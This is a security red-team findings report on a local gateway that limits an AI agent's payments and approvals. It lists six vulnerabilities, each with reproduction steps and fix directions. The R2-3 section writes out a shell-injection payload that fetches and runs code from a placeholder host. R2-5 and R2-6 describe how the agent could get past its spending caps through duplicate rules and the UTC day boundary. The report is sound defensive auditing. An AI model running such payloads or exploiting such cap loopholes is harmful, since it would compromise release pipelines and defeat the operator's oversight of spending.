# R2 findings

Worktree `test/red-team-r2` at `85b297d`. Product code was not changed. Tests were not executed in this pass (the task forbids running commands); each proof below is an `it` in `tests/attack-r2.test.ts` that asserts the safe behaviour, which the current code does not implement.

| id | severity | attacker | description | file:line | proof |
| --- | --- | --- | --- | --- | --- |
| R2-1 | medium | A web page the operator visits, after DNS rebinding to `127.0.0.1`, or any other local OS user | Loopback HTTP accepts any `Host`. Unauthenticated `/healthz` and `/.well-known/oauth-protected-resource` answer, so a rebound origin can read them. | `packages/body/src/server.ts:396` | `R2-1 rejects a foreign Host on loopback so a rebound browser learns nothing` |
| R2-2 | high | Another OS account on a shared Windows machine, when the state directory inherits a broad NTFS ACL | `init --local` "owner only" is `chmod 0o600`. Node on Windows does not translate that into an owner-only DACL, so a second account that can traverse the directory can read `key.pem` and `agent.token`. Running the body as another user does not close this. | `packages/body/src/init-local.ts:74` | `R2-2 ownerOnly sets a Windows DACL, chmod 0o600 is not the restriction` |
| R2-3 | high | A principal who can `workflow_dispatch` but must not push a new workflow (branch protection, or a token with Actions access) | `inputs.confirm` is interpolated into `run:` shell. That bypasses the "type publish" gate and runs arbitrary commands in a job with `id-token: write` (npm trusted publishing / MCP registry OIDC). | `.github/workflows/release.yml:49`, `.github/workflows/mcp-registry.yml:34` | `R2-3 workflow_dispatch confirm is not expanded inside a shell run script` |
| R2-4 | medium | Whoever can set the environment of `verax serve`, without write access to the state directory | `--env-file` merges into the existing environment. `export KEY=value` lines are skipped. Ambient `VERAX_DOWNSTREAM` and `VERAX_TLS_TERMINATED` survive a file that never mentions them. | `packages/body/src/init-local.ts:36`, `packages/body/src/cli.ts:117` | `R2-4 --env-file replaces ambient VERAX_* instead of merging over them` |
| R2-5 | medium | The brain, once an operator has saved two `spend` rules (a loose one first) | `evaluate` uses the first rule whose tool is `spend`. A later tighter rule, including one with the same id, never runs. The loose payee and cap stay in force. | `packages/proxy/src/policy.ts:255` | `R2-5 a second spend rule is rejected instead of silently ignored` |
| R2-6 | medium | The brain, holding `verax:pay`, watching the clock | `dailyMaxMinor` resets at UTC midnight. In UTC+3 that is 03:00 local, so one local calendar day can clear the cap twice. | `packages/proxy/src/approvals.ts:177` | `R2-6 daily spend counted on one operator-local day does not reset at UTC midnight` |

## R2-1 Host is not bound to loopback

**Steps.** `verax serve` bound to `127.0.0.1`. From another local account, or from a browser whose name has rebinding to `127.0.0.1`, send `GET /healthz` and `GET /.well-known/oauth-protected-resource` with `Host: rebind.example`.

**Expected.** `400`. A name that is not the bind host is not this service. The rebound page's origin must not become same-origin with the body.

**Actual.** `200`. `/healthz` returns `{"ok":true}`. The protected-resource document returns the issuer, audience and the scope list, including `verax:pay` and `verax:approve`. No `Access-Control-Allow-Origin` is set; classic cross-origin reads still fail, and a cross-origin `POST` with `Content-Type: application/json` dies on the preflight. Rebinding removes that barrier because the page's origin is the rebound name. Mutating routes still require a bearer the page does not have. This is a read of "the body is up" plus OAuth metadata, not an approval.

**Fix direction.** Before parsing the path, require `Host` (and the URL hostname) to be the bind host, or `127.0.0.1` / `localhost` / `::1` when the bind is loopback. Reject with `400` otherwise. Do not add a reflective CORS allow-origin.

## R2-2 chmod is not an NTFS ACL

**Steps.** On Windows, `verax init --local` writes `local-issuer/key.pem` and `agent.token` through `writeFileSync(..., { mode: 0o600 })` and `ownerOnly`, which is `chmodSync(path, 0o600)` and swallows failure. Place the state directory where the parent ACL grants `BUILTIN\Users` read (a shared project folder, not a locked user profile). Sign in as a different OS user and open the key file.

**Expected.** The DACL names only the creating user and the administrators/system accounts the operator asked for. Another interactive user gets access denied.

**Actual.** Node's `mode` on Windows changes the readonly bit, not the discretionary ACL. The comment in `ownerOnly` says the platform may ignore the mode, and the function then stops. Inherited ACEs remain. This is not the F3 same-user case: the second account never shares the body's token, and "run the body as another OS user" does not help when that user's files stay readable.

**Fix direction.** On `win32`, after creating each secret file and the state directory, set an explicit DACL (icacls or `SetNamedSecurityInfo`) that grants the owner and denies `Users` / `Everyone`. Keep `chmod` for POSIX. Fail `init` if the ACL call fails, instead of swallowing it.

## R2-3 workflow input expanded in the shell

**Steps.** Actions → release (or mcp-registry) → Run workflow. Set `confirm` to a shell payload such as `$(curl -s https://example.invalid/x|sh)` or `"; id; "`. The job's confirmation step expands `${{ inputs.confirm }}` inside `run:`.

**Expected.** The input is compared as data. A value other than `publish` or `check` exits 1. Nothing in the input is parsed as shell. Publish still requires the literal word, and still runs only with `id-token: write` after the suite.

**Actual.** `release.yml` assigns `c="${{ inputs.confirm }}"`. `mcp-registry.yml` puts the same expansion in `test` and in `echo`. GitHub expands `${{ }}` before bash runs, so the confirmation step is remote code execution. The job then holds `id-token: write`, which trusted publishing turns into an npm publish credential. `if:` expressions that compare `inputs.confirm` are not this bug; the `run:` blocks are. `pull_request_target` is not used. Third-party actions in these two workflows are pinned by commit.

**Fix direction.** Pass the input as an environment variable (`CONFIRM: ${{ inputs.confirm }}`) and compare `"$CONFIRM"` in the script. Keep the `if:` guards. Do not echo the raw input.

## R2-4 env file merges, and `export` is dropped

**Steps.** Start `verax serve --env-file verax.env` in a process whose environment already contains `VERAX_DOWNSTREAM` (a hostile document) and `VERAX_TLS_TERMINATED=1`. Let the file be a dotenv-style `export VERAX_ISSUER=verax-local` plus `VERAX_BIND=127.0.0.1:8787`, and not mention the other two names.

**Expected.** The file is the whole configuration. Names it does not set are unset. An `export ` prefix is accepted, so the issuer in the file replaces the process issuer.

**Actual.** `loadEnvFile` writes only keys it parses, into the object it was given (`process.env` from `verax serve`). `export VERAX_ISSUER=...` fails the key regex and is skipped, so the process issuer remains. `VERAX_DOWNSTREAM` and `VERAX_TLS_TERMINATED` stay. The body then attaches the ambient downstream, and a non-loopback bind would be legal because TLS-terminated is already set. This does not require writing the state directory. It does require influencing the serve process environment (parent, service unit, or a shell startup file).

**Fix direction.** Parse `export ` the way dotenv does. Build a fresh object from the file and assign that over the process environment for `VERAX_*`, clearing `VERAX_*` the file does not contain. Reject a file that sets neither issuer nor JWKS rather than continuing on the ambient values.

## R2-5 the first spend rule hides the rest

**Steps.** Policy with two rules, both `tool: "spend"`. The first allows payee `mallory` up to a large cap. The second allows only `acme` up to a small cap. The brain calls `spend` for `mallory` above the second cap.

**Expected.** Load fails. Two rules for `spend`, or two rules with one id, are a configuration error. Nothing is deferred.

**Actual.** `parsePolicyDocument` accepts both. `evaluate` does `rules.find(r => r.tool === "spend")` and returns the first. The call is `defer` / `approval-required` under the loose rule. Approving it records a payment the tighter rule would have refused. Same-id duplicates take the same path: `rule(id)` also returns the first match.

**Fix direction.** Reject duplicate rule ids and a second rule for `spend` (and for any other tool) at parse time. Do not let later rules override silently and do not let earlier rules hide them.

## R2-6 daily cap uses UTC, not the operator's day

**Steps.** Policy `dailyMaxMinor` is 100. An approved spend of 80 is stored at `2026-09-24T22:00:00Z` (2026-09-25 01:00 UTC+3). At `2026-09-25T01:00:00Z` (2026-09-25 04:00 UTC+3) the brain asks for another 80. Both instants are the same Istanbul calendar day.

**Expected.** The day's sum is 80, so the second approval hits `budget-exceeded`.

**Actual.** `spentTodayMinorOf` takes `Date.UTC` of the UTC year/month/day. The first row is "yesterday" and the sum at the second instant is 0. The budget guard allows the second spend. The brain can spend the cap once before 00:00 UTC and again after, which in Turkey is a single evening (21:00 then 00:30, or 01:00 then 04:00). Approval-time recheck and pending-sibling exclusion are in place; they use this same window. Clock rollback by the operator is a separate, local-admin problem and was not counted here.

**Fix direction.** Define the day in the policy (an offset in minutes, default UTC, stated in the rule text the operator sees). Bucket `createdAtMs` in that zone. Keep the approval-time recheck on the same bucket.

## Checked and solid

- Token forgery, scope confusion, `_ref` replay, parallel spend, tool-name and memory-id tricks, JSON-RPC batch/`__proto__`, halt, 413, revoked `jti`: left to R1. Not re-tested as new findings.
- Local-mode `verax:approve` / `verax:audit` over HTTP returns 403 (`server.ts` around the `jwksFile` check). Approve-before-amount is the F1 path in `approvePending` (hash check, then expiry, then budget guard).
- Ledger tail truncation is the F1 verify path. Not reopened.
- Same-user read of the state directory is F3. Not reported again.
- Classic CSRF: no cookie session. `POST` JSON needs a preflight, and there is no `Access-Control-Allow-Origin`, so a foreign page cannot call `/api/approve` or read `/api/ledger`. The hole is rebinding (R2-1), not a missing CSRF token.
- `Host: [` is already turned into `400` (`tests/body-http.test.ts`). That is a parser crash, not a rebinding check.
- Downstream: stdio requires `trust: "same-user"`; HTTP forbids that flag; redirects are `redirect: "error"`; the body's bearer is not copied into the child env; prefixed names that collide with `TOOL_NAMES` throw `downstream-name-collision`; tool list is capped at 256 tools and 64 KiB each. A child that changes behaviour after `tools/list` is the hostile tool server the threat model already names.
- Spend argument checks reject non-integers, strings, amounts `<= 0`, currency outside `^[A-Z]{3}$`, and unknown payees. Approval compares `requestHash` to the snapshot, so args changed after defer do not approve.
- `iat` more than 60s ahead is rejected in `auth.ts`. `--days` is an integer from 1 to 90. Pairing codes are 8 digits, 5 attempts, stored as SHA-256; the compare is not `timingSafeEqual`, and five attempts cannot turn that into a practical oracle.
- Body size is enforced by bytes read, not only `Content-Length`. `/api/ledger` defaults to 1000 rows and caps at 5000. Node's default request timeout still applies; this server does not disable it.
- Workflows other than the two `confirm` scripts: no `pull_request_target`, actions pinned by commit, `permissions` default to `contents: read`, `npm ci --ignore-scripts`. Package `files` is `dist` only. No `postinstall` in the three packages.
- HTTP error bodies are short codes (`unauthorized`, `fault`, `transport`). Handler detail goes to stderr, not the client. `www-authenticate` carries the resource-metadata URL, which is what the OAuth discovery document already publishes.
- Prompt injection via tool results is disclosed in `docs/THREAT_MODEL.md` and was not refiled.
